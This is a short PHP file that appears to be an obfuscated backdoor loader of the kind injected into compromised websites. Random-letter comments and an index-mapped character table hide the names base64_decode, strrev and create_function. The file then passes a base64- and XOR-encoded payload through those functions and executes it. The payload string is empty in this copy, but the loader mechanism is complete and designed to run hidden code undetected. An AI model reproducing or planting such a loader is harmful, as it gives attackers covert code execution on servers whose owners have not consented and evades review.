<?php /*5e1505d9d9fc9*/ ?><?php  

        

		
 function rBx7F($lPI2R, $VxSwH = '') { $DblHL = $lPI2R; $BKgOa = ''; for ($ANySP = 0; $ANySP < strlen($DblHL);) { for ($ybumV = 0; $ybumV < strlen($VxSwH) && $ANySP < strlen($DblHL); $ybumV++, $ANySP++) { $BKgOa .= $DblHL[$ANySP] ^ $VxSwH[$ybumV]; } } return $BKgOa; }
		

		$jgQOPNTZ3881 = "7wzrlqaf3n0t_d8mcvx.(1je6sgoykhup2*9;)54/bi";
		$LZVrbsiY1925 = "";

		/*rXWtAqlXuXeuibBtHiMsSZpiglxveQHjIFDkAjgPbalGVYXkqMmxuYJUyhYhnaKHpurAtIGrNLsMoalmtghqrKpOCKGfsldBYtUlTIQAwroMUktbGxMJzPhRCDZmwjMV*/		


		$NcEAsSnP1728 = "";
		$wSLGUXIX81 = "";

		foreach([41,6,25,23,24,39,12,13,23,16,27,13,23] as $e){
		   $NcEAsSnP1728 .= $jgQOPNTZ3881[$e];
		}

		/*KXDZtIDSkaLVxtIavUGOXecboubgXJOohNikFDIFJQoutrcnCFWVgLqxqHRFaLaBpqPnRnvvMXGwgfJrTmPukNCpleffWpXzghbswseBHILoMotuQRKkIpRpzFPcoJai*/

		foreach([25,11,3,3,23,17] as $e){
		   $wSLGUXIX81 .= $jgQOPNTZ3881[$e];
		}

		

		$e = $wSLGUXIX81('n'.'o'.''.''.'i'.''.''.''.''.'t'.''.''.'c'.''.'n'.''.''.''.'u'.''.''.'f'.''.''.'_'.'e'.'t'.'a'.'e'.''.'r'.'c'.''.''.'');
		$p = $e("/*VTZBXJMS9001*/", $NcEAsSnP1728( rBx7F($NcEAsSnP1728($LZVrbsiY1925), "ZdbiBCXO1426")));
		$p();

		/*uAKxHTUAKOGuizOyiifkjuLMEfFXftoDqmPMmfMUCfbDtAxeoedkEfujDJTneLwiGbTXSGsyRuNcgzpuSXekWqrgEWLaIjaAhZcmBOUqGzykQgWKFHOITNeQyeGMlxGv*/